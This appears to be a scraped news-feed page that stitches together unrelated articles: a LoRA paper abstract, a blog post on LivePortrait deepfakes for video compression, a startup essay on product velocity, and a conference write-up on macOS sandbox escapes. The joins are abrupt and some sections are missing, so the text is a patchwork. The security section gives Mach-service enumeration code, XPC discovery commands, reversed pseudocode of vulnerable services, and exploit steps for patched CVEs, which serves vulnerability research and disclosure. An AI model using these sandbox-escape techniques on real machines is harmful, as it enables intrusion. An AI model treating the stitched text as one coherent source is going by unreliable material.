            <span>Abstract:</span>Fine-tuning is a crucial paradigm for adapting pre-trained large language models to downstream tasks. Recently, methods like Low-Rank Adaptation (LoRA) have been shown to match the performance of fully fine-tuned models on various tasks with an extreme reduction in the number of trainable parameters. Even in settings where both methods learn similarly accurate models, \emph{are their learned solutions really equivalent?} We study how different fine-tuning methods change pre-trained models by analyzing the model's weight matrices through the lens of their spectral properties. We find that full fine-tuning and LoRA yield weight matrices whose singular value decompositions exhibit very different structure; moreover, the fine-tuned models themselves show distinct generalization behaviors when tested outside the adaptation task's distribution. More specifically, we first show that the weight matrices trained with LoRA have new, high-ranking singular vectors, which we call \emph{intruder dimensions}. Intruder dimensions do not appear during full fine-tuning. Second, we show that LoRA models with intruder dimensions, despite achieving similar performance to full fine-tuning on the target task, become worse models of the pre-training distribution and adapt less robustly to multiple tasks sequentially. Higher-rank, rank-stabilized LoRA models closely mirror full fine-tuning, even when performing on par with lower-rank LoRA models on the same tasks. These results suggest that models updated with LoRA and full fine-tuning access different parts of parameter space, even when they perform equally on the fine-tuned distribution. We conclude by examining why intruder dimensions appear in LoRA fine-tuned models, why they are undesirable, and how their effects can be minimized.

        <p>Update: <a href="https://news.ycombinator.com/item?id=42084977">Discussion on Hacker News</a></p>

<p>I’ve been having quite a bit of fun with the fairly recent <a href="https://github.com/KwaiVGI/LivePortrait">LivePortrait</a> model, generating deepfakes of my friends for some cheap laughs.</p>

<p><img src="https://mlumiste.com/assets/images/compression/elon.gif" alt=""></p>

<p><em>The inevitable Elon Musk deepfake, picture by <a href="https://www.debbierowe.com/corporate">Debbie Rowe</a></em></p>

<p>The emerging field of 2D avatar/portrait animation (being able to animate any still image, avoiding the need to render cumbersome 3D models that would struggle with small facial details) is a harbinger of things to come. In the best case, it will be ubiquitous on social media (the authors have already added an extension to animate cute animal faces) and in the worst, trust on the internet will be heavily undermined. But one overlooked use case of the technology is (talking head) video compression. After all, <a href="http://prize.hutter1.net/hfaq.htm#compai">prediction is compression</a>, so a sufficiently powerful face generator should be able to compress frame information into an extremely sparse set of cues to reconstruct the same frame from.</p>

<p>This was briefly explored in Nvidia’s seminal <a href="https://nvlabs.github.io/face-vid2vid/">facevid2vid</a> paper that compared their models’ compression ratio to the classical H.264 codec. The main idea is quite simple: given a source image that is shared between the sending and receiving side, the only information that needs to be transmitted is the change in expression, pose and facial keypoints. The receiving side then simply animates the source frame into the new one, using these motion parameters.</p>

<p><img src="https://mlumiste.com/assets/images/compression/facevid2vid.png" alt=""></p>

<p>The main upside is that this method achieves pretty reasonable perceptual quality at an extremely low bitrate, while at a comparable level a traditional video codec will show heavy artifacts. There are, of course, downsides as well:</p>

<ul>
  <li>there is no longer a natural lever to trade-off between quality and bitrate, like the <a href="https://trac.ffmpeg.org/wiki/Encode/H.264">CRF</a> for H.264.</li>
  <li>as a model with large generative capacity, there’s essentially no limit to how bad the worst case reconstruction can be. It could in theory render a completely different person, or distort your face into a monstrous gremlin.</li>
  <li>the impressive bitrate does not come for free, as e.g. LivePortrait needs to run on an RTX 4090 for real-time processing. In the space of possible learned compression models, compared to something like <a href="https://github.com/microsoft/DCVC">DCVC</a>, it is a further improvement in compression rate, at the cost of having a 10x+ slower model.</li>
</ul>

<p>Anyway, LivePortrait is a beefed up version of facevid2vid, so let’s look at how good it is for video compression. I extracted the first frame of the above driving video as a key frame, simulating a scenario where instead of a high quality enrolled image, key frames are extracted on-demand in the background. This means that in addition to being same identity animation, this is also same video animation - by far the simplest scenario to work on for the model, as you have very good alignment between the source and driving frames. It’s also the closest to a drop-in replacement of the current video call experience. Here are the results of a quick try:</p>

<p><img src="https://mlumiste.com/assets/images/compression/self.gif" alt=""></p>

<p><em>Self-animation, i.e. driving a keyframe of the video with the motion</em></p>

<p>It’s possible to uncover discrepancies in a side by side analysis:</p>

<ul>
  <li>the head tends to be a bit shaky in all my experiments, probably because LivePortrait processes frames in isolation, without any motion prior. Or maybe my driving video is low quality. 🤷</li>
  <li>since the eye gaze is off camera in the key frame (“neutral mode”), the model seems to map it incorrectly in every frame after that.</li>
  <li>teeth are generally hallucinated, but this is only noticeable in smiling videos.</li>
</ul>

<p>As expected, the discrepancies are much more obvious if we provide a driving video with shoulder movement and difficult head angles. Also, the further the inference setup is from the training one (which is same video animation), the worse the results.</p>

<p>Nonetheless, it’s clear that there is a set of frames, arguably a large proportion of video-conferencing, where the model manages to produce subjectivelly distinguishable reconstructions. Sure, in a side by side analysis we might be able to tell which is the original and which is the reconstruction. However, if you are only looking at the generated output, it works very well.</p>

<p>So how small is the bitrate of this reconstruction? The model equation for transforming the face keypoints is:</p>

\[x_d = s_d \times (x_{c, s} R_d + \delta_d) + t_d\]

<p>where $x_{c, s} \in \mathbb{R}^{K \times 3}$ are the “canonical” implicit 3D facial keypoints of the source image, $R_d \in \mathbb{R}^{3 \times 3}$ is a 3D <a href="https://en.wikipedia.org/wiki/Rotation_matrix#In_three_dimensions">rotation matrix</a> (relative to the canonical keypoints), $\delta_d \in \mathbb{R}^{K \times 3}$ denotes the expression deformations, $t_d \in \mathbb{R}^3$ is a translation vector and $s_d$ is just a scaling coefficient and $K$, the number of keypoints, is a hyperparameter. The intuition of this equation is provided in the Nvidia paper:</p>

<p><img src="https://mlumiste.com/assets/images/compression/rotation.png" alt=""></p>

<p>Of course, $x_d$ is not yet the final reconstruction of the image, only the transformed keypoints. There are some flow field estimations and warp operations remaining to actually turn the source image into the driving one. Nonetheless, the sender only needs to transmit $s_d$, $R_d$, $\delta_d$ and $t_d$ for a lifelike reconstruction to happen on the receiver’s side.</p>

<p>And since we know their shapes, we can also infer the bitrate: $3 \times 3 +  K \times 3 + 3 = 75 $ numbers at $ K = 21 $, the default LivePortrait setting. At half precision floats, that’s $ 16 \times 75 \times 30 $ bits per second for a 30FPS video, or 36kbit/s. This could be compressed further - note that each frame is processed in isolation. This could be alleviated with entropy coding and having a temporal prior. In facevid2vid, simple entropy coding reduced the baseline model’s bitrate by nearly 40%, while using an adaptive number of keypoints reduced it by 60%. Using the first figure, we should be able to bring down LivePortrait’s bitrate to about 22kbit/s. For reference, the low bitrate challenge in <a href="https://www.compression.cc/leaderboard/video_0_05/test/">CLIC 2024</a> featured video compression at 50kbit/s, but as expected, the models showed significantly worse subjective quality scores than at 500kbit/s.</p>

<p>LivePortrait has roughly the same bitrate as the facevid2vid had (model transmits similar information), but achieving better results. Looking at the evaluation results for the latter method, we see that as expected, their model only provides a single point on the bitrate-quality curve. So without any evaluation results at hand, I would expect LivePortrait to move strictly downwards, matching a lower H.264 CRF for equal preference. Extrapolating ahead, a future model might achieve the same perceptual quality as a visually lossless CRF (FFmpeg suggests 17 or 18). Then, it is up to the user whether they want to squeeze bitrate to near zero at the cost of compute.</p>

<p><img src="https://mlumiste.com/assets/images/compression/bdrate.png" alt=""></p>

<h2 id="how-does-it-work-what-is-the-magic">How does it work (what is the magic?)</h2>

<p>The main problem of frame animation is that we are projecting a 3D object to a 2D image. So our model needs to understand the rotation and deformation of the underlying object. The good thing about faces is that they are rigid, i.e. tends to have limited degrees of freedom in movement and nearby pixels move together in predictable ways. Nonetheless, this has proven to be a hard problem.</p>

<p>The main innovation of facevid2vid, that also powers LivePortrait, was realising that this can be formed as a 3D rotation problem. By rotating a set of abstract 3D tensors enough times, the model learns to actually map these to keypoints of the face, as if someone would have painstakingly labelled them for each frame. Up until then, models like <a href="https://aliaksandrsiarohin.github.io/first-order-model-website/">First Order Motion Model</a> had also used the implicit keypoints approach, but only with 2D keypoints.</p>

<p>The second thing that seems to work is quite humdrum: compared to facevid2vid, LivePortrait has seriously scaled up the training dataset to 69 million high quality frames, and added regional GAN losses that focus only on the local regions like the face or the lips. So rather than any architectural breakthrough, it seems to have been a lot of iterative improvements on dataset and losses.</p>

<p>While being able to learn facial keypoints self-supervisedly is a testament to why deep learning is cool, it also allows direct controllability of the avatar. Since the rotation matrix has a direct geometric interpretation, you can input parameters for a required pose. LivePortrait adds on top of this by training small neural networks to control lip and eye movement. This is a big step ahead in terms of avatar controllability which generally has not been a strong suit of many generative approaches (I’m looking at you, diffusion).</p>

<p>LivePortrait methodology is quite different from SotA learned video compression models like <a href="https://github.com/microsoft/DCVC">DCVC</a>, which need to encode spatial information with a great degree of fidelity targeting pixel-aligned distortion losses such as MSE. A generative model unencumbered by pixel-alignment and optimised for various GAN based perceptive losses, only tries to generate something plausible. On a spectrum of model architectures, it achieves higher compression efficiency at the cost of model complexity. Indeed, the full LivePortrait model has 130m parameters compared to DCVC’s 20 million. While that’s tiny compared to LLMs, it currently requires an Nvidia RTX 4090 to run it in real time (in addition to parameters, a large culprit is using expensive warping operations). That means deploying to edge runtimes such as Apple Neural Engine is still quite a ways ahead.</p>

<p>Nonetheless, models and hardware become faster reliably quickly. Also, the same identity animation problem is significantly easier than animating Elon Musk or your cat, so probably a model optimised for teleconferencing could be remarkably smaller. That’s why it might not be that much of a moonshot. Publicly, Zoom seems to have played with the idea of <a href="https://www.business-standard.com/technology/tech-news/zoom-expands-ai-features-introduces-custom-avatars-and-upgraded-companion-124101000315_1.html">avatar technology</a>. I’ll let the precise use cases be determined by product people, but off the top of my head:</p>

<ul>
  <li>having a more formal version of yourself avatar for days when youre working in your underwear</li>
  <li>animating a 4k studio quality avatar from a driving video from my terrible webcam</li>
  <li>using pose and gaze connection to seat the avatars in some kind of more immersive virtual meeting room</li>
  <li>letting your avatar attend meetings / send messages as a digital twin. If all the driving keypoints are directly manipulatable, you could programmatically control a photorealistic video.</li>
</ul>

<p>Of course it’s possible that none of these will be useful or socially normalised, yet its fun to theorise.</p>

<div id="readability-page-1" class="page"><p>
            Building the right thing shouldn't take very long -- doing away with nonsense makes product development really fast"
        </p><div>
            <p>We’ve begun preparations for a major product launch. For us, it’s a big deal; it’s exciting. It’s a really big commitment. It’s also the kind of thing that threatens to become a quagmire, a set of features perpetually in-development.</p>
<p>We’ve found that making the right thing – something people want – is <em>intrinsically</em> quite fast. By contrast, it’s all the other stuff that slows down product teams. It’s process, it’s distance between deciders and doers, it’s bloated specifications.</p>
<p>With this in mind, I’ve realized that our company has developed – largely by accident – some general principles for achieving product velocity. Some of these may be wrong, and we’ll likely change our perspectives over time, but I thought I’d share them here nonetheless.</p>
<h2 id="principles-for-product-velocity">Principles for product velocity</h2>
<h2 id="we-should-probably-do-less">We should probably do less</h2>
<p>All else being equal, there’s usually a trade-off between speed and quality. For the most part, doing something faster usually requires a bit of compromise. There’s a corner getting cut somewhere.</p>
<p>But all else need not be equal. We can often eliminate requirements … and just do less stuff. With sufficiently limited scope, it’s usually feasible to build something quickly and to a high standard of quality.</p>
<p>Most companies assign requirements, assert a deadline, and treat quality as an output. We tend to do the opposite. Given a standard of quality, what can we ship in 60 days?</p>
<p>Recent escapades notwithstanding, Elon Musk has a similar <a href="https://medium.com/@cclark.osi/use-teslas-five-step-production-algorithm-to-improve-your-own-processes-d3c5bd427f37">thought process here</a>. Before anything else, an engineer should <em>make the requirements less dumb.</em></p>
<h2 id="idiot-mode-usually-works">Idiot mode usually works</h2>
<p>We’re big fans of the midwit meme. Put simply, the midwit meme usually shows an idiot and a genius agreeing on a simple solution, while a person of average intelligence flails around complaining about complicated stuff.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/midwit.png">
</p>
</figure>
<p>Early in our company’s history, we challenged ourselves to operate in idiot mode as often as possible. When we’ve made mistakes, we’ve usually been overthinking things. We often arrive at a workable solution by asking ourselves, <em>how would I do this if I were an idiot</em>.</p>
<h2 id="some-problems-arent-important">Some problems aren’t important</h2>
<p>A small number of problems matter a lot. For example, we have to take security extremely seriously. It’s really not okay for us to cut corners there.</p>
<p>But we can choose to ignore certain other things. For example, we know that our front-end doesn’t look very good on mobile devices. For the foreseeable future, we’ll just need our customers not to use mobile devices. We’d obviously like for our software to look great everywhere, but we’re choosing not to spend time on our mobile layout. No one really seems to mind.</p>
<p>I’ll be damned if we ship dark mode any time soon.</p>
<h2 id="just-make-the-thing">Just make the thing</h2>
<p>We don’t have a process for product development. We don’t do Figma mocks. We don’t write PRDs. We don’t really have a design system. We don’t do <em>agile</em>. We don’t have OKRs. We don’t even have a firm product roadmap. We don’t have any A/B testing or growth hacks.</p>
<p>Our customers are engineers, so we generally expect that our engineers can handle product, design, and all the rest. We don’t need to have a whole committee weighing in.</p>
<figure>
<p><img src="https://ssoready.com/blog/from-the-founders/methodology-is-bullshit/peopleskills.jpg">
</p>
</figure>
<p>We just make things and see whether people like them.</p>
<h2 id="rewrites-need-to-happen-sometimes">Rewrites need to happen sometimes</h2>
<p>Companies often think they’ll move faster if they defer technical debt as long as possible. That’s sometimes fine, but we’re comfortable doing major rewrites when appropriate.</p>
<p>Sometimes the fastest path to building the right thing looks like this:</p>
<ol>
<li>Build the wrong thing</li>
<li>Realize it’s the wrong thing</li>
<li>Replace the wrong thing with the right thing</li>
</ol>
<p>If it seems reasonably useful to eliminate technical debt, we’ll do it.</p>
<h2 id="pay-vendors-to-do-it">Pay vendors to do it</h2>
<p>When possible, we buy solutions from vendors instead of building things in-house. For example, we use a vendor called Fern to generate our SDKs. They do a pretty good job.</p>
<p>Of course, using a vendor has significant upfront costs – these things are usually pretty expensive. It also restricts our freedom a bit.</p>
<p>But using a vendor is typically the right move. We have very limited engineering resources, and our engineering resources are really expensive. A week of a single engineer’s time costs about $5,000 in cash. It’s worth <em>vastly</em> more than that when we factor in opportunity costs (i.e. how much better off we’d be if we spent that engineer’s time on something else).</p>
<p>Relatively few things are actually worth building.</p>
<h2 id="dont-hire-people">Don’t hire people</h2>
<p>We don’t expect that adding headcount would increase our team’s output. Hiring is slow and hard. Onboarding and people management consume time. Even for a ramped hire, collaboration’s expensive.</p>
<p>It’s especially hard to bring on <em>strong</em> people, the kind of people that can contribute without a lot of support.</p>
<p>So although we have the resources to build a large engineering team, we do everything possible to stay small. It just makes life a lot easier.</p>


<h2 id="closing-thoughts">Closing thoughts</h2>
<p>To an extent that wasn’t obvious to us before, we’ve realized that product development shouldn’t take very long. If you know what your customers need, have a strong team, and avoid distracting nonsense, velocity is pretty close to inevitable.</p>

            <description><![CDATA[<p>URL: <a href="https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/">https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/</a>, See on <a href="https://news.ycombinator.com/item?id=42084588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p>This is a blog post for my presentation at the conference <a href="https://powerofcommunity.net/2024.htm">POC2024</a>. The slides are uploaded <a href="https://github.com/jhftss/jhftss.github.io/blob/main/res/slides/A%20New%20Era%20of%20macOS%20Sandbox%20Escapes.pdf">here</a>.</p>

<p>In the macOS system, most processes are running in a restricted sandbox environment, whether they are Apple’s own services or third-party applications. Consequently, once an attacker gains Remote Code Execution (RCE) from these processes, their capabilities are constrained. The next step for the attacker is to circumvent the sandbox to gain enhanced execution capabilities and broader file access permissions.</p>

<p>But how to discover sandbox escape vulnerabilities? Upon reviewing the existing issues, I unearthed a significant <strong>overlooked attack surface</strong> and a novel attack technique. This led to the discovery of <strong>multiple new sandbox escape vulnerabilities</strong>: CVE-2023-27944, CVE-2023-32414, CVE-2023-32404, CVE-2023-41077, CVE-2023-42961, CVE-2024-27864, CVE-2023-42977, <strong>and more</strong>.</p>

<h2 id="about-the-macos-sandbox">About the macOS Sandbox</h2>

<h3 id="the-app-sandbox">The App Sandbox</h3>

<p>Nowadays, as required by the Mac AppStore, most applications are running with the <strong>App Sandbox</strong> restrictions. The sandboxed application must have the entitlement “<strong>&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;&lt;true/&gt;</strong>”. The sandbox restrictions are applied in the <strong>dyld initialization</strong> function before the app’s main function. After entering the sandbox, it will be <strong>containerized</strong> and all the file operations will be limited to its data container path.</p>

<p>It should be noted that all the files dropped by the sandboxed application will be marked as <strong>quarantined by default</strong>. The dropped files will have the special <strong>quarantine extended attribute</strong>. And the extended attribute can’t be removed by the sandboxed app due to the configuration in the sandbox profile:</p>

<div><pre><code>(deny file-write-xattr (xattr "com.apple.quarantine") (with no-log)))
</code></pre></div>

<p>According to the Apple’s design guide:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019161759137.png" alt="image-20241019161759137"></p>

<p>The applications without App Sandbox have unrestricted access to all user data and system resources. While the applications with the sandbox restrictions have only limited access.</p>

<p>Specifically, the capabilities of a sandboxed application are defined in the rule configuration file <code>/System/Library/Sandbox/Profiles/application.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019162228998.png" alt="image-20241019162228998"></p>

<p>For example, it will restrict access to certain <strong>system resources</strong> such as network and hardware. It also restricts the <strong>filesystem access</strong> and only a limited number of <strong>Mach services</strong> are reachable from a sandboxed application.</p>

<p>BTW, the <strong>forked</strong> child process will also <strong>inherit</strong> the application sandbox restrictions of the parent process. But the process launched via the <code>LaunchService.framework</code> <strong>don’t inherit</strong> the sandbox restriction. For example, you can launch a non-sandboxed application via the system <code>open</code> command directly.</p>

<h3 id="the-service-sandbox">The Service Sandbox</h3>

<p>Compared to the common application sandbox, the <strong>Service Sandbox</strong> is a bit different.</p>

<p>Most Apple’s <strong>daemon services</strong> are running in a <strong>Service Sandbox</strong> context. They are restricted by the sandbox profiles defined in these system locations:</p>

<div><pre><code>/System/Library/Sandbox/Profiles/*.sb
/usr/share/sandbox/*.sb
</code></pre></div>

<p>The sandbox restrictions are applied in the service’s <code>main</code> function by calling the API <code>sandbox_init_XXX</code>, specified with a sandbox profile name or path <strong>manually</strong>. After entering the sandbox, they are usually <strong>not containerized</strong>.</p>

<p>Most importantly, the dropped files are <strong>not quarantined by default</strong>, unless the <strong>quarantine-related</strong> APIs are invoked <strong>manually</strong>.</p>

<h2 id="the-attack-surfaces">The Attack Surfaces</h2>

<h2 id="the-old-common-ways">The Old Common Ways</h2>

<h3 id="attack-via-the-launchserviceframework">Attack via the LaunchService.framework</h3>

<p>The first common method is to attack the non-sandboxed applications via the system LaunchService framework.</p>

<p>The application could natively exist on the macOS system, an example is the <a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Waisberg-Skeletons-In-The-App-Sandbox.pdf">CVE-2021-30864</a>, which can manipulate the <strong>$HOME</strong> environment variable for the system non-sandboxed application <strong>Terminal.app</strong>. When the Terminal application is launched, the malicious payload under the controlled home path <code>$HOME/.profile</code> will be executed without the sandbox restriction.</p>

<p>Another attack scenario is to <strong>drop a new non-sandboxed application</strong> and then launch it. However, the newly dropped application will be <strong>quarantined</strong> and prevented from launching! So if we can drop a file or folder without being quarantined, then we can bypass the app sandbox completely. The example is the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a>, which abuses the <strong>devfs</strong> to drop a folder without being quarantined because the <strong>devfs</strong> doesn’t support the extended attributes.</p>

<h3 id="attack-the-available-mach-services">Attack the available Mach services</h3>

<p>The second common way to escape the sandbox is to attack the available Mach services listed in the app sandbox profile.</p>

<p>All Mach service information on the system is stored in the file <code>/System/Library/xpc/launchd.plist</code>. And we can check if a Mach service is available to a sandboxed application by using the <code>bootstrap_look_up</code> API. So, it’s easy for us to enumerate all the Mach services available to app sandbox like this:</p>

<div><pre><code>void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &amp;service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary&lt;NSString*, id&gt;* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary&lt;NSString*, id&gt;* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary&lt;NSString*, id&gt;* job = launchDaemons[key];
      NSDictionary&lt;NSString*, id&gt;* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
</code></pre></div>

<p>Note that these Mach services exist either in the <strong>System domain</strong> or the <strong>User domain</strong>.</p>

<p>More XPC services available to app sandbox are ignored by our researchers!</p>

<h2 id="the-new-overlooked-one">The New Overlooked One</h2>

<p>The overlooked XPC services are those that exist in the <strong>PID domain</strong>.</p>

<p>In contrast to old common XPC services that exist in the <strong>System/User domain</strong>, their service type is “<strong>Application</strong>” type rather than the “<strong>System</strong>” or “<strong>User</strong>” type. And they will be launched upon request by an app and terminate when the requesting application exits.</p>

<p>The XPC services for the <strong>System/User domain</strong> are reachable to a sandboxed application only if they are defined in the sandbox profile “<strong>application.sb</strong>”. But all XPC services required by an app and its framework are visible to the app’s <strong>PID domain</strong>.</p>

<p>It seems that most XPC services for the <strong>PID domain</strong> are not expected to be invoked from a sandboxed application, so there are no additional entitlement checks or sandbox checks for the incoming XPC clients.</p>

<p>I drew a table to explain their differences:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165127768.png" alt="image-20241019165127768"></p>

<p>Let’s take the <code>SystemShoveService.xpc</code> as an example:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019165457530.png" alt="image-20241019165457530"></p>

<p>It is an XPC bundle inside the system private <code>ShoveService.framework</code>. From the infoPlist dictionary, we can see that its “Service Type” is “<strong>Application</strong>” and its bundle identifier is “<strong>com.apple.installandsetup.shoveservice.system</strong>”.</p>

<p>So, how to send requests to this XPC service from a sandboxed application?</p>

<p>Through my research, I found that registering the XPC service to a sandboxed application’s PID domain is as simple as a single line of code:</p>

<div><pre><code>[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
</code></pre></div>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019170019639.png" alt="image-20241019170019639"></p>

<p>From the call stack backtrace of bundle loading, we can see that the XPC service will be <strong>registered</strong> to the app’s PID domain <strong>automatically when the corresponding framework is loaded</strong>.</p>

<p><code>SystemShoveService.xpc</code> does’t check the requested XPC client, so it can be exploited to <strong>escape the app sandbox</strong> after loading the <code>ShoveService.framework</code>. Moreover, it has the powerful SIP-related entitlement “<strong>com.apple.rootless.install</strong>”, and thus it can be exploited to <strong>bypass the SIP protection at the same time</strong>.</p>

<p>The vulnerability has been designated as <strong>CVE-2022-26712</strong>. More details can be found from <a href="https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/">my previous blogpost</a>.</p>

<p>Generally speaking, all XPC services with the Service Type “<strong>Application</strong>” are <strong>potential targets</strong> to escape the app sandbox. So we can explore this overlooked attack surface by enumerating the XPC services in the system (private) frameworks:</p>

<div><pre><code>find /System/Library/Frameworks -name *.xpc
find /System/Library/PrivateFrameworks -name *.xpc
</code></pre></div>

<p>After discovering an XPC service for <strong>PID Domain</strong> that doesn’t check the incoming XPC client, we can attempt to attack the <strong>potential target</strong> by using the following two methods:</p>

<ol>
  <li>Drop an app <strong>folder</strong> without being quarantined. (Get a full sandbox escape like the <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html">CVE-2023-32364</a> did.)</li>
  <li>Drop a <strong>file</strong> without being quarantined. (A <strong>ZIP</strong> or <strong>DMG</strong> file that contains a non-sandboxed application.)</li>
</ol>

<p>After diving into the new overlooked attack surface, I managed to discover dozens of new sandbox escape vulnerabilities. Next are the details.</p>

<p>You may wonder why there’s no CVE assigned for this vulnerability.</p>

<p>According to Apple, “CVEs are only assigned to software vulnerabilities previously released to production and not to vulnerabilities for beta-only software.” This vulnerability <strong>only affects the macOS Sonoma Beta version</strong>.</p>

<h3 id="the-issue">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105753261.png" alt="image-20241020105753261"></p>

<p>The <code>SKRemoteTaskRunnerProtocol</code> has only one method</p>

<p>“<code>runTask:arguments:withReply:</code>”.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020105834371.png" alt="image-20241020105834371"></p>

<p>This only XPC method is designed to execute an arbitrary command with the specified arguments:</p>

<p>At line 30, the <strong>executable path</strong> and <strong>arguments</strong> are controlled by the sandboxed XPC client. Therefore, an attacker can abuse this XPC method to execute an arbitrary system command directly without any sandbox restrictions.</p>

<h3 id="the-issue-1">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p>The <code>AudioAnalyticsHelperServiceProtocol</code> has two methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111649270.png" alt="image-20241020111649270"></p>

<p>The issue exists in the second XPC method “<code>createZipAtPath:hourThreshold:withReply:</code>”. The following is pseudo-code from the Objective-c class <code>AudioAnalyticsHelperService</code>:</p>

<div><pre><code>// reversed from the Objective-c class AudioAnalyticsHelperService

-(void) createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply {
    NSString *compressPath = [path stringByAppendingPathComponent:@"compressed"];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:compressPath]) {
        [fm createDirectoryAtPath:compressPath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    for (NSString *item in [fm contentsOfDirectoryAtPath:path error:nil]) {
        if ([[item pathExtension] isEqualToString:@"json"]) {// &amp;&amp; the file creation date meets the requirement
            NSString *srcPath = [path stringByAppendingPathComponent:item];
            NSString *dstPath = [compressPath stringByAppendingPathComponent:item];
            [fm moveItemAtPath:srcPath toPath:dstPath error:nil];
        }
    }
    
    NSString *zipPath = [path stringByAppendingPathComponent:[NSString stringWithFormat:@"audio_analytics_reporting_%@.zip", [self nowTimeString]]];
    [self createZipArchiveForURL:[NSURL fileURLWithPath:compressPath] destinationURL:[NSURL fileURLWithPath:zipPath]];
}
</code></pre></div>

<p>As we can see here, it helps to compress an arbitrary path that is specified by the XPC client.</p>

<p>It first creates a folder named <code>compressed</code> in the specified path, if the path does not exist. It then enumerates the files in the specified path with the <code>json</code> suffix and moves them to the <code>compressed</code> folder. In the file move operation, an attacker can move an arbitrary file to an arbitrary location by replacing the <code>compressed</code> folder with a symlink. The source file content is not checked, but the destination file path must have the suffix <code>json</code>.</p>

<p>Finally, it creates a zip file from the <code>compressed</code> folder.</p>

<p>Note that the <strong>newly generated zip file will not be quarantined</strong> because the XPC service itself is not sandboxed at all.</p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h3 id="the-issue-2">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/TrialServer.framework/XPCServices/TrialArchivingService.xpc
</code></pre></div>

<p>This XPC service will enter the <strong>Service Sandbox</strong> by using the sandbox profile <code>/System/Library/Sandbox/Profiles/com.apple.trial.TrialArchivingService.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113955167.png" alt="image-20241020113955167"></p>

<p>However, the dropped files will not be quarantined.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p>The <code>TrialArchivingServiceProtocol</code> has four methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112735952.png" alt="image-20241020112735952"></p>

<p>The issue exists in the XPC method “<code>extractArchiveFromHandle:withArchiveName:toDirectory:destDirExtension:postExtractionCompression:completion:</code>”.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112903145.png" alt="image-20241020112903145"></p>

<p>It helps to extract an archive file passed from a sandboxed application to a specified location. However, it <strong>doesn’t pass the quarantine extended attribute to the extracted content</strong>.</p>

<h3 id="the-exploit-and-demo-2">The exploit and demo</h3>

<p>There is a small challenge to exploit the issue.</p>

<p>By abusing the XPC method, the macho file in the archive will lose the <strong>executable (X)</strong> permission after the extraction. So the extracted application cannot be launched directly. Then I came up with a similar vulnerability to overcome this challenge: <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a> can be exploited not only to bypass the gatekeeper, but also to escape the application sandbox. The trick to that exploit is to use symlink rather than the macho file itself.</p>

<p>Then I encountered another new challenge:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113237752.png" alt="image-20241020113237752"></p>

<p>This XPC method only supports to extract <strong>directories</strong> and <strong>regular files</strong>, and does not allow extracting <strong>symlink</strong> from the archive.</p>

<p>To overcome the new challenge, I extract the payload application to the sandboxed <strong>app container path</strong>, where the sandboxed app has the read and write permission. (Luckily, the service sandbox profile is not too strict here.) Next, I can create the symlink from the sandboxed application directly, or just assign the executable permission to the extracted macho by calling the API <code>chmod</code>.</p>

